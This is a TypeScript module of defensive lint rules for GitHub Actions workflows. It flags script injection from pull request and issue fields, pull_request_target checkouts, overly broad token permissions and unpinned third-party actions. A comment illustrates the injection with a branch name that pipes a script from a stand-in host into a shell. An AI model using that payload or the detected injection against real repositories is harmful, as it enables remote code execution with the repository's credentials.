/**
 * GitHub Actions workflow security.
 *
 * CI is the one place in a repository where untrusted input, write credentials and the ability to
 * publish all meet. A workflow that interpolates a pull request title into a shell command hands
 * an attacker the repository's token; nobody notices, because the workflow keeps passing.
 *
 * These checks cover what a security linter for Actions looks for first. They read the same
 * workflow files the scan already fetched, so they cost nothing extra, and they are written
 * against the text rather than a YAML parse: workflows are small, the patterns are anchored to
 * Actions' own syntax, and a parse failure on an unusual file would silently skip it.
 *
 * The rules are ours. See docs/reference/19-tool-licensing.md for why we do not vendor someone
 * else's rule pack.
 */

import type { IssueInput } from "../../scanner-rules";
import { confidenceFromSignals, type Signal } from "./signals";

export function isWorkflowPath(path: string): boolean {
  return /^\.github\/workflows\/[^/]+\.ya?ml$/.test(path);
}

interface Hit {
  file: string;
  line: number;
  detail: string;
}

function lineOf(content: string, index: number): number {
  let line = 1;
  for (let i = 0; i < index && i < content.length; i++) if (content[i] === "\n") line++;
  return line;
}

function evidence(hits: Hit[]): string {
  const shown = hits.slice(0, 4).map((h) => `${h.detail} (${h.file}:${h.line})`);
  return `${shown.join("; ")}${hits.length > 4 ? ` +${hits.length - 4} more.` : "."}`;
}

/**
 * Context expressions an attacker controls by opening a pull request or an issue.
 *
 * Interpolated into a `run:` block these are not values, they are code: GitHub substitutes the
 * text *before* the shell sees it, so a branch named `"; curl evil.sh | sh #` executes. The fix is
 * always the same shape — pass it through `env:` and reference `"$VAR"`, which the shell quotes.
 */
const ATTACKER_CONTROLLED =
  /\$\{\{\s*(?:github\.event\.(?:issue\.title|issue\.body|pull_request\.title|pull_request\.body|pull_request\.head\.(?:ref|label|repo\.[a-z_.]+)|comment\.body|review\.body|discussion\.(?:title|body)|head_commit\.message|commits\[[^\]]*\]\.message)|github\.head_ref)\s*\}\}/g;

/** `run:` blocks, as [startIndex, text] — everything indented under a `run:` key. */
function runBlocks(content: string): Array<[number, string]> {
  const blocks: Array<[number, string]> = [];
  const lines = content.split("\n");
  let offset = 0;
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!;
    const m = /^(\s*)-?\s*run:\s*(\|[-+]?|>[-+]?)?\s*(.*)$/.exec(line);
    if (m) {
      const indent = m[1]!.length;
      let text = m[3] ?? "";
      const start = offset;
      // A block scalar (`run: |`) continues while lines stay more indented than the key.
      if (m[2]) {
        for (let j = i + 1; j < lines.length; j++) {
          const next = lines[j]!;
          const nextIndent = next.search(/\S/);
          if (next.trim() !== "" && nextIndent <= indent) break;
          text += `\n${next}`;
        }
      }
      blocks.push([start, text]);
    }
    offset += line.length + 1;
  }
  return blocks;
}

/** Untrusted input interpolated straight into a shell command. */
export function checkWorkflowScriptInjection(
  workflows: Record<string, string>,
  issues: IssueInput[],
): void {
  const hits: Hit[] = [];
  for (const [file, content] of Object.entries(workflows)) {
    for (const [start, block] of runBlocks(content)) {
      ATTACKER_CONTROLLED.lastIndex = 0;
      for (const m of block.matchAll(ATTACKER_CONTROLLED)) {
        hits.push({
          file,
          line: lineOf(content, start),
          detail: m[0].replace(/\s+/g, " "),
        });
      }
    }
  }
  if (hits.length === 0) return;

  issues.push({
    category: "Security",
    title: "Untrusted input runs as shell code in a GitHub Actions workflow",
    severity: "high",
    why: "GitHub substitutes ${{ … }} into the script before the shell runs it, so this text is executed, not passed as a value. Anyone who can open a pull request or comment chooses that text, which makes it a path to running commands with your workflow's token.",
    timeSaved: "2h",
    fixId: "workflow-script-injection",
    checkedFor: [
      "`run:` blocks interpolating github.event.* / github.head_ref",
      `${Object.keys(workflows).length} workflow file(s)`,
    ],
    foundEvidence: evidence(hits),
    confidence: confidenceFromSignals(
      hits.map(
        (h): Signal => ({ kind: "exact_match", detail: `${h.detail} in ${h.file}:${h.line}` }),
      ),
    ),
    detection: ["rule-based"],
    recommendedFix:
      'Move the value into an `env:` block on the step and reference it as a quoted shell variable: `env:\n  TITLE: ${{ github.event.pull_request.title }}`, then use `"$TITLE"` in the script. The shell then treats it as data.',
  });
}

/** True when any of the three `on:` spellings includes `pull_request_target`. */
export function hasPullRequestTargetTrigger(content: string): boolean {
  // `on: pull_request_target` or `on: [push, pull_request_target]`
  if (/^\s*on:\s*(?:\[[^\]]*\bpull_request_target\b[^\]]*\]|pull_request_target\b)/m.test(content))
    return true;
  // Block form — the trigger as its own key or list item under `on:`.
  return /^\s*(?:-\s*)?pull_request_target\s*:?\s*$/m.test(content);
}

/**
 * `pull_request_target` runs with a *writable* token and repository secrets, unlike
 * `pull_request`. Checking out the pull request's own code under it means running an
 * outsider's build scripts with those credentials in the environment.
 */
export function checkPullRequestTarget(
  workflows: Record<string, string>,
  issues: IssueInput[],
): void {
  const hits: Hit[] = [];
  for (const [file, content] of Object.entries(workflows)) {
    // Three spellings, all common: `on: pull_request_target`, a `[a, b]` list, and the block
    // form where the trigger is its own key. Matching only the block form missed the shortest
    // and most common one.
    if (!hasPullRequestTargetTrigger(content)) continue;
    const checkout =
      /uses:\s*actions\/checkout@[^\n]*\n(?:[^\n]*\n){0,6}?[^\n]*ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)/.exec(
        content,
      );
    if (checkout) {
      hits.push({
        file,
        line: lineOf(content, checkout.index),
        detail: "pull_request_target checks out the PR head",
      });
    }
  }
  if (hits.length === 0) return;

  issues.push({
    category: "Security",
    title: "Workflow builds pull request code with write access",
    severity: "critical",
    why: "`pull_request_target` runs in the context of your repository — writable token, secrets available — and this workflow checks out the contributor's branch under it. A pull request from anyone can then run its own build scripts with those credentials.",
    timeSaved: "2h",
    fixId: "workflow-pr-target-checkout",
    checkedFor: ["pull_request_target triggers", "actions/checkout with a PR head ref"],
    foundEvidence: evidence(hits),
    confidence: confidenceFromSignals(
      hits.map((h): Signal => ({ kind: "exact_match", detail: `${h.file}:${h.line}` })),
    ),
    detection: ["rule-based"],
    recommendedFix:
      "Use `pull_request` for anything that builds or tests contributor code. Keep `pull_request_target` only for jobs that never check out the branch (labelling, commenting), and never combine it with a PR head checkout.",
  });
}

/**
 * A workflow with no `permissions:` block inherits the repository default, which is commonly
 * write-all. Every third-party action in the job then runs with a token that can push code and
 * publish releases, whether it needs to or not.
 */
export function checkWorkflowPermissions(
  workflows: Record<string, string>,
  issues: IssueInput[],
): void {
  const missing: Hit[] = [];
  const broad: Hit[] = [];
  for (const [file, content] of Object.entries(workflows)) {
    const writeAll = /^\s*permissions:\s*write-all\s*$/m.exec(content);
    if (writeAll) {
      broad.push({ file, line: lineOf(content, writeAll.index), detail: "permissions: write-all" });
      continue;
    }
    if (!/^\s*permissions:/m.test(content)) {
      missing.push({ file, line: 1, detail: "no permissions block" });
    }
  }

  const hits = [...broad, ...missing];
  if (hits.length === 0) return;

  issues.push({
    category: "Security",
    title:
      broad.length > 0
        ? "GitHub Actions token has write access to everything"
        : "Workflows do not restrict the GitHub Actions token",
    // Explicit `write-all` is a decision we can point at; a missing block only inherits a default
    // we cannot read from here, so it is reported one step lower and as the weaker claim.
    severity: broad.length > 0 ? "high" : "medium",
    why:
      broad.length > 0
        ? "`write-all` gives every step — including third-party actions you do not control — a token that can push commits, publish releases and edit issues."
        : "With no `permissions:` block a workflow inherits the repository default, which on older repositories is read/write for everything. Setting it explicitly is what makes the token's reach a decision rather than an accident.",
    timeSaved: "30m",
    fixId: "workflow-permissions",
    checkedFor: ["`permissions:` blocks in each workflow", "`write-all` grants"],
    foundEvidence: evidence(hits),
    confidence: confidenceFromSignals(
      broad.length > 0
        ? broad.map((h): Signal => ({ kind: "exact_match", detail: `${h.file}:${h.line}` }))
        : [{ kind: "heuristic", detail: "repository default permissions are not visible to us" }],
    ),
    detection: ["rule-based"],
    recommendedFix:
      "Add `permissions:\n  contents: read` at the top of each workflow and grant anything more only on the job that needs it.",
  });
}

/** Actions from outside GitHub's own namespaces, pinned to a moving tag rather than a commit. */
export function checkUnpinnedActions(
  workflows: Record<string, string>,
  issues: IssueInput[],
): void {
  const hits: Hit[] = [];
  const seen = new Set<string>();
  for (const [file, content] of Object.entries(workflows)) {
    for (const m of content.matchAll(/uses:\s*([\w.-]+)\/([\w.-]+(?:\/[\w.-]+)*)@([\w.-]+)/g)) {
      const [, owner, , ref] = m;
      // `actions/` and `github/` are GitHub's own; a repository trusts them already by using
      // Actions at all, and pinning them by SHA is a stricter posture than we should force.
      if (owner === "actions" || owner === "github") continue;
      // A 40-character hex ref is an immutable commit — the thing we are asking for.
      if (/^[a-f0-9]{40}$/i.test(ref!)) continue;
      const key = `${m[1]}/${m[2]}@${ref}`;
      if (seen.has(key)) continue;
      seen.add(key);
      hits.push({ file, line: lineOf(content, m.index), detail: key });
    }
  }
  if (hits.length === 0) return;

  issues.push({
    category: "Security",
    title: `Third-party GitHub Action${hits.length === 1 ? "" : "s"} pinned to a movable tag`,
    severity: "medium",
    why: "A tag can be repointed at any time by whoever owns the action, so the code that runs in your pipeline can change without any commit to your repository. This is the route used in real supply-chain compromises of Actions.",
    timeSaved: "30m",
    fixId: "workflow-unpinned-action",
    checkedFor: ["third-party `uses:` refs", "commit-SHA pinning"],
    foundEvidence: evidence(hits),
    confidence: confidenceFromSignals(
      hits.map(
        (h): Signal => ({ kind: "exact_match", detail: `${h.detail} in ${h.file}:${h.line}` }),
      ),
    ),
    detection: ["rule-based"],
    recommendedFix:
      "Pin each third-party action to a full commit SHA with the version in a trailing comment: `uses: owner/action@a1b2c3…  # v4.1.0`. Dependabot updates SHA pins, so this costs no maintenance.",
  });
}

/** Every workflow security check, over the workflow files already fetched by the scan. */
export function checkWorkflowSecurity(
  fileContents: Record<string, string>,
  issues: IssueInput[],
): void {
  const workflows = Object.fromEntries(
    Object.entries(fileContents).filter(([path, body]) => isWorkflowPath(path) && body),
  );
  if (Object.keys(workflows).length === 0) return;

  checkWorkflowScriptInjection(workflows, issues);
  checkPullRequestTarget(workflows, issues);
  checkWorkflowPermissions(workflows, issues);
  checkUnpinnedActions(workflows, issues);
}
